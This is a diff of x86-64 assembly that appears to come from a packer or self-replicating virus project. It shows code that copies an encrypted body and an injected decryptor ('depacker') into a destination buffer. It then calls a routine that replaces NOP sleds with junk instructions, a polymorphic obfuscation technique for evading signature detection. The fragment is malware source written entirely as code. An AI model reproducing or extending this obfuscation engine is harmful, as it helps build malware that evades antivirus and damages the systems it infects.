@@ -285,7 +285,22 @@ _copy_unencrypted_part:
 	cld
 	rep movsb
 ; update our index
-	lea	rsi, [rel _string]
+;	lea	rsi, [rel _string]
+;	lea rcx, [rel _encrypted_part_start]
+;	sub rcx, rsi
+;	add QWORD [rsp + 116], rcx
+
+; Then we run _byterpl(depacker start in destination, depacker size);
+; to replace nop sleds by junks instructions
+	lea rcx, [rel _string]
+	lea rsi, [rel _encrypted_part_start]
+	sub rsi, rcx
+	mov rdi, QWORD [rsp + 108]
+	add rdi, QWORD [rsp + 116]
+	call _byterpl
+
+; Incremente our index in our destination mmap
+	lea rsi, [rel _string]
 	lea rcx, [rel _encrypted_part_start]
 	sub rcx, rsi
 	add QWORD [rsp + 116], rcx
@@ -325,8 +340,8 @@ _inject_modified_depacker:
 ; First, copy the noped depacker to destination
 	mov rdi, QWORD [rsp + 108]
 	add rdi, QWORD [rsp + 116]
-	lea rsi, [rel _decrypt_noped]
-	lea rcx, [rel _end_decrypt_noped]
+	lea rsi, [rel _decrypt]
+	lea rcx, [rel _end_decrypt]
 	add rcx, 2
 	sub rcx, rsi
 	cld
@@ -334,16 +349,16 @@ _inject_modified_depacker:
 
 ; Then we run _byterpl(depacker start in destination, depacker size);
 ; to replace nop sleds by junks instructions
-	lea rcx, [rel _decrypt_noped]
-	lea rsi, [rel _end_decrypt_noped]
+	lea rcx, [rel _decrypt]
+	lea rsi, [rel _end_decrypt]
 	sub rsi, rcx
 	mov rdi, QWORD [rsp + 108]
 	add rdi, QWORD [rsp + 116]
 	call _byterpl
 
 ; Incremente our index in our destination mmap
-	lea rsi, [rel _decrypt_noped]
-	lea rcx, [rel _end_decrypt_noped]
+	lea rsi, [rel _decrypt]
+	lea rcx, [rel _end_decrypt]
 	add rcx, 2
 	sub rcx, rsi
 	add QWORD [rsp + 116], rcx
